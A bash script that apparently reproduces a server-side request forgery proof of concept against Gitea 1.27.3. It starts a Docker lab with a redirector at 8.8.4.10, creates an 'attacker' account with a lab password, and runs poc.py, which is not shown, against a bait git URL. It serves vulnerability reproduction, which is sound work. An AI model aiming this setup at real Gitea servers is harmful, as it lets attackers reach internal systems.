#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
export COMPOSE_PROJECT_NAME=gitea-git-redir-ssrf
chmod +x poc.py internal-git.sh redir.py

echo "== docker compose up (gitea 1.27.3 + loopback git + external 302) =="
docker compose up -d

echo "== wait for Gitea =="
ok=0
for i in $(seq 1 60); do
  code="$(curl -s -o /tmp/gv -w '%{http_code}' --max-time 5 http://127.0.0.1:18103/api/v1/version || true)"
  if [[ "$code" == "200" ]]; then
    echo "IOC gitea-up http=$code"
    ok=1
    break
  fi
  echo "IOC wait-gitea i=$i http=$code"
  sleep 3
done
if [[ "$ok" != 1 ]]; then
  echo "FAIL Gitea did not become ready"
  docker compose logs --tail=80 gitea
  exit 1
fi

echo "== wait for redirector =="
ok=0
for i in $(seq 1 40); do
  code="$(docker compose exec -T gitea wget -q -S -O /dev/null http://8.8.4.10/bait.git/HEAD 2>&1 | awk '/HTTP\//{print $2; exit}' || true)"
  if [[ "$code" == "302" ]]; then
    echo "IOC redir-up http=$code"
    ok=1
    break
  fi
  echo "IOC wait-redir i=$i http=$code"
  sleep 2
done

cid="$(docker compose ps -q gitea)"
echo "== seed attacker =="
docker exec -u git "$cid" gitea admin user create \
  --username attacker \
  --password LabPass123! \
  --email attacker@localhost.invalid \
  --must-change-password=false >/dev/null 2>&1 || true

echo "== poc.py =="
python3 poc.py http://127.0.0.1:18103 http://8.8.4.10/bait.git
